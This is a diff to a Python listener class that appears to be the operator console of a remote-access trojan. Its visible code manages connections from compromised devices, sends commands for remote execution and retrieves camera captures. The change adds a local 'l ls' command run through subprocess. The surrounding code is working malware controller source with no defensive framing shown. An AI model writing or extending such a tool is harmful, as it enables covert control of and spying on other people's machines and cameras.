@@ -1,4 +1,4 @@
-import socket, json
+import socket, json, subprocess
 import base64
 import sys
 import threading
@@ -135,15 +135,14 @@ class Listener:
 				help_message = colored("\n Type 'help' to see it\n\n", "yellow")
 				help_message += colored(" print", "green") + " - show all connections;\n"
 				help_message += colored(" choose", "green") + " - choose connection;\n"
+				help_message += colored("l ls", "green") + " - execute ls on own machine;\n"
 				help_message += colored(" exit", "red") + " - stop the program; \n"
 				print(help_message)
-
 
 			elif command == "exit":
 				self.exit()
 				self.execute_remotely("exit")
 				break
-
 
 			elif command == "camera":
 				if self.chosen_connection:
@@ -163,6 +162,11 @@ class Listener:
 					else:
 						self.write_file(file, res)
 				else: print(colored("[~] You have to choose one device", "yellow"))
+
+			elif command.split()[0] == "l" and command.split()[1] == "ls":
+				res = UkDecode(subprocess.check_output("ls", shell = True))
+				print(res)
+
 
 			elif len(command.split()):
 				if self.chosen_connection:
